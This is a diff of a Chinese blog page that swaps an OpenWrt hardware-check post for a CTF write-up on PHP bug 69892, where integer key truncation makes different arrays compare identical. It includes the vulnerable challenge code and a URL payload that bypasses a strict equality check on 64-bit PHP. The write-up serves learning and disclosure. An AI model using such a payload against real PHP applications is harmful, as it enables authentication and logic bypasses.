@@ -28,7 +28,7 @@
 
 
 
-  <meta name="keywords" content="openwrt," />
+  <meta name="keywords" content="PHP,安全," />
 
 
 
@@ -37,16 +37,32 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="今天就不写太多了。短一点。买来一个OpenWrt的路由器，今天刚到的货，赶快拆开看看是不是替我换了RAM和FLASH的。那么怎么查看它是不是真的有那么大呢？在字符界面下，查看RAM的命令是这个：cat /proc/meminfo&amp;gt; 1.  root@OpenWrt:~# cat /proc/meminfo&amp;gt; 2.  MemTotal:          61984 kB查看FLASH的">
+<meta name="description" content="漏洞简介漏洞标题：Different arrays compare indentical due to integer key truncation
+漏洞来源：https://bugs.php.net/bug.php?id=69892
+影响组件: PHP
+影响版本：5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1
+实例说明题目用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="查看OpenWrt的RAM和FLASH">
-<meta property="og:url" content="http://blog.evalbug.com/2015/05/14/openwrt_ram_flash/index.html">
+<meta property="og:title" content="PHP 不同数组之间比较由于整数键截断导致结果相同">
+<meta property="og:url" content="http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/index.html">
 <meta property="og:site_name" content="Medici.Yan's Blog">
-<meta property="og:description" content="今天就不写太多了。短一点。买来一个OpenWrt的路由器，今天刚到的货，赶快拆开看看是不是替我换了RAM和FLASH的。那么怎么查看它是不是真的有那么大呢？在字符界面下，查看RAM的命令是这个：cat /proc/meminfo&amp;gt; 1.  root@OpenWrt:~# cat /proc/meminfo&amp;gt; 2.  MemTotal:          61984 kB查看FLASH的">
-<meta property="og:updated_time" content="2015-10-13T19:32:12.000Z">
+<meta property="og:description" content="漏洞简介漏洞标题：Different arrays compare indentical due to integer key truncation
+漏洞来源：https://bugs.php.net/bug.php?id=69892
+影响组件: PHP
+影响版本：5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1
+实例说明题目用">
+<meta property="og:image" content="http://i12.tietuku.com/01185defe88a9bbd.png">
+<meta property="og:image" content="http://i12.tietuku.com/fa9e4e52abd55fde.png">
+<meta property="og:image" content="http://i12.tietuku.com/938aa5414d465107.png">
+<meta property="og:image" content="http://i12.tietuku.com/17b76b83611f7f32.jpg">
+<meta property="og:updated_time" content="2015-11-09T19:21:27.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="查看OpenWrt的RAM和FLASH">
-<meta name="twitter:description" content="今天就不写太多了。短一点。买来一个OpenWrt的路由器，今天刚到的货，赶快拆开看看是不是替我换了RAM和FLASH的。那么怎么查看它是不是真的有那么大呢？在字符界面下，查看RAM的命令是这个：cat /proc/meminfo&amp;gt; 1.  root@OpenWrt:~# cat /proc/meminfo&amp;gt; 2.  MemTotal:          61984 kB查看FLASH的">
+<meta name="twitter:title" content="PHP 不同数组之间比较由于整数键截断导致结果相同">
+<meta name="twitter:description" content="漏洞简介漏洞标题：Different arrays compare indentical due to integer key truncation
+漏洞来源：https://bugs.php.net/bug.php?id=69892
+影响组件: PHP
+影响版本：5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1
+实例说明题目用">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -56,7 +72,7 @@
   };
 </script>
 
-  <title> 查看OpenWrt的RAM和FLASH | Medici.Yan's Blog </title>
+  <title> PHP 不同数组之间比较由于整数键截断导致结果相同 | Medici.Yan's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -207,7 +223,7 @@
           
           
             
-              查看OpenWrt的RAM和FLASH
+              PHP 不同数组之间比较由于整数键截断导致结果相同
             
           
         </h1>
@@ -216,8 +232,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-05-14T17:52:23+08:00" content="2015-05-14">
-            2015-05-14
+          <time itemprop="dateCreated" datetime="2015-11-10T03:23:48+08:00" content="2015-11-10">
+            2015-11-10
           </time>
         </span>
 
@@ -226,20 +242,8 @@
             &nbsp; | &nbsp; 分类于
             
               <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/Linux/" itemprop="url" rel="index">
-                  <span itemprop="name">Linux</span>
-                </a>
-              </span>
-
-              
-              
-                ， 
-              
-
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/Linux/校园网/" itemprop="url" rel="index">
-                  <span itemprop="name">校园网</span>
+                <a href="/categories/PHP/" itemprop="url" rel="index">
+                  <span itemprop="name">PHP</span>
                 </a>
               </span>
 
@@ -254,8 +258,8 @@
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/05/14/openwrt_ram_flash/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/05/14/openwrt_ram_flash/" itemprop="commentsCount"></span>
+              <a href="/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -269,7 +273,55 @@
       
 
       
-        <span itemprop="articleBody"><h2 id="今天就不写太多了。短一点。">今天就不写太多了。短一点。</h2><div class="body-text"><br><br>买来一个OpenWrt的路由器，今天刚到的货，赶快拆开看看是不是替我换了RAM和FLASH的。那么怎么查看它是不是真的有那么大呢？<br><br>在字符界面下，查看RAM的命令是这个：<br><br>cat /proc/meminfo<br>&gt; 1.  root@OpenWrt:~# cat /proc/meminfo<br>&gt; 2.  MemTotal:          61984 kB<br>查看FLASH的命令是这个：<br><br>dmesg | grep spi<br>&gt; 1.  dmesg | grep spi<br>&gt; 2.  [    0.670000] m25p80 spi0.0: mx25l6405d (8192 Kbytes)<br>这样就可以消除自己的疑虑了。<br><br></div></span>
+        <span itemprop="articleBody"><h3 id="漏洞简介">漏洞简介</h3><p>漏洞标题：<strong>Different arrays compare indentical due to integer key truncation</strong></p>
+<p>漏洞来源：<a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69892</a></p>
+<p>影响组件: PHP</p>
+<p>影响版本：5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1</p>
+<h3 id="实例说明">实例说明</h3><h4 id="题目">题目</h4><p>用一个 CTF 题目来说明一下上面的这个漏洞,顺便记录下 CTF 的一类题</p>
+<a id="more"></a>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> =<span class="string">"medicean"</span>; // 正常情况下 flag 不会出现在这里</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'user'</span>])) die(show_source(__FILE_<span class="number">_</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = [<span class="string">'admin'</span>, <span class="string">'xxoo'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'user'</span>] === <span class="variable">$user</span> &amp;&amp; $_GET[<span class="string">'user'</span>][<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">    echo <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>说明：</p>
+<p>题目中 xxoo 部分，原题是 (string)time.time(), 为了方便，我就直接改成一个字符串了。</p>
+</blockquote>
+<h4 id="题目分析">题目分析</h4><p>我们直接看后面 if 中的判断逻辑：</p>
+<ul>
+<li>$_GET[‘user’] 是一个全局的变量，我们传的是字符串，它就是字符串，传的是数组，那么它的值就是数组</li>
+<li>$user 是一个数组, [0 =&gt; ‘admin’, 1 =&gt; ‘xxoo’]</li>
+<li>=== 三个等号的意思就是类型是同一类型，并且值也是相同的</li>
+<li>$_GET[‘user’][0] 的值不能等于 ‘admin’</li>
+</ul>
+<p>也就是说，如果要使这个 if 条件成立，就必须让两个键值不相等的数组经过 ===  比较后返回 true。</p>
+<p>然后我们测试：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  php -r <span class="string">"var_dump([1=&gt;0]==[1=&gt;0]);"</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br><span class="line">➜  ~  php -r <span class="string">"var_dump([1=&gt;0]===[1=&gt;0]);"</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br><span class="line">➜  ~  php -r <span class="string">"var_dump([1=&gt;0]==[2=&gt;0]);"</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(false)</span></span></span><br><span class="line">➜  ~  php -r <span class="string">"var_dump([1=&gt;0]===[2=&gt;0]);"</span></span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(false)</span></span></span><br></pre></td></tr></table></figure>
+<p>这不扯淡嘛!</p>
+<p>然后我们再来看我们这个漏洞：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  php -r <span class="string">"var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);"</span> </span><br><span class="line"><span class="function"><span class="title">bool</span><span class="params">(true)</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>键名为 0 的数组与键名为 0x100000000 的数组居然相等了！</strong></p>
+<p>也就是说：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> : [<span class="number">0</span> =&gt;<span class="string">'admin'</span>, <span class="number">1</span>=&gt;<span class="string">'xxoo'</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'user'</span>]: [<span class="number">0x100000000</span> =&gt;<span class="string">'admin'</span>, <span class="number">1</span>=&gt;<span class="string">'xxoo'</span>]</span><br></pre></td></tr></table></figure>
+<p>这样就能使题目当中的条件成立。</p>
+<h4 id="构造_payload_:">构造 payload :</h4><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link_url">http://localhost/test.php?user</span>[<span class="link_label">1</span>]=xxoo&amp;user[4294967296]=admin</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>2^32 == 0x100000000 == 4294967296</p>
+<p>由于是截断漏洞，所以 0x100000000 后面再多几个 0 也是可以的，适当转换成对应的 10 进制数就好</p>
+</blockquote>
+<h4 id="测试结果">测试结果</h4><p><strong>发现在 32 位 PHP 上并不能成功，只能在 64 位 PHP 上测试成功。</strong></p>
+<p><img src="http://i12.tietuku.com/01185defe88a9bbd.png" alt=""></p>
+<p>于是我们使用 <code>var_dump</code> 来看一下每个变量：</p>
+<p>代码如下：</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">&lt;?php</span><br><span class="line">$user = ['admin', 'xxoo'];</span><br><span class="line"></span><br><span class="line">echo 'var_dump($user):&lt;br/&gt;</span><span class="variable">&lt;br&gt;</span>';</span><br><span class="line">var_dump(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">echo '<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>var_dump(<span class="variable">$_GET</span>[<span class="string">"user"</span>]);<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>';</span><br><span class="line">var_dump(<span class="variable">$_GET</span>['<span class="keyword">user</span>']);</span><br><span class="line"></span><br><span class="line">echo '<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>var_dump(<span class="variable">$_GET</span>[<span class="string">"user"</span>][<span class="number">0</span>]);<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>';</span><br><span class="line">var_dump(<span class="variable">$_GET</span>['<span class="keyword">user</span>'][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">echo '<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>var_dump((<span class="variable">$_GET</span>[<span class="string">"user"</span>] === <span class="variable">$user</span>));<span class="variable">&lt;br&gt;</span><span class="variable">&lt;br&gt;</span>';</span><br><span class="line">var_dump((<span class="variable">$_GET</span>['<span class="keyword">user</span>'] === <span class="variable">$user</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>在 32 位 PHP 上测试结果：<br><img src="http://i12.tietuku.com/fa9e4e52abd55fde.png" alt=""></p>
+</li>
+<li><p>在 64 位 PHP 上测试结果：<br><img src="http://i12.tietuku.com/938aa5414d465107.png" alt=""></p>
+</li>
+</ul>
+<p><strong>结果一目了然，32位 PHP 上，会把 user[4294967296] 中的 4294967296 在接收后解析成字符串，而 64 位则会解析成整数。</strong></p>
+<h3 id="扩展知识">扩展知识</h3><p>如何判断自己的 PHP 是 32 位还是 64 位的？</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'if 64-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'32-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'PHP_INT_SIZE'</span> . PHP_INT_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="官方修复方案">官方修复方案</h3><p><img src="http://i12.tietuku.com/17b76b83611f7f32.jpg" alt=""></p>
+</span>
       
     </div>
 
@@ -277,7 +329,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/openwrt/" rel="tag">#openwrt</a>
+            <a href="/tags/PHP/" rel="tag">#PHP</a>
+          
+            <a href="/tags/安全/" rel="tag">#安全</a>
           
         </div>
       
@@ -286,13 +340,11 @@
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/05/14/phpmysqldump/" rel="prev">mysql脱库工具php版</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/05/14/fw150r_wr703n_openwrt/" rel="next">FW150R 和 TP-Link WR703N 刷 OpenWrt 及 相关配置</a>
+              <a href="/2015/11/08/python_why_m_in_medicean_is_true/" rel="next">为什么 'm' in ('medicean') 是 True</a>
             
           </div>
         </div>
@@ -317,8 +369,8 @@
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/05/14/openwrt_ram_flash/"
-                   data-title="查看OpenWrt的RAM和FLASH" data-url="http://blog.evalbug.com/2015/05/14/openwrt_ram_flash/">
+              <div class="ds-thread" data-thread-key="2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/"
+                   data-title="PHP 不同数组之间比较由于整数键截断导致结果相同" data-url="http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/">
               </div>
             
           </div>
@@ -410,7 +462,7 @@
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#今天就不写太多了。短一点。"><span class="nav-number">1.</span> <span class="nav-text">今天就不写太多了。短一点。</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实例说明"><span class="nav-number">2.</span> <span class="nav-text">实例说明</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#题目"><span class="nav-number">2.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目分析"><span class="nav-number">2.2.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造_payload_:"><span class="nav-number">2.3.</span> <span class="nav-text">构造 payload :</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试结果"><span class="nav-number">2.4.</span> <span class="nav-text">测试结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩展知识"><span class="nav-number">3.</span> <span class="nav-text">扩展知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#官方修复方案"><span class="nav-number">4.</span> <span class="nav-text">官方修复方案</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
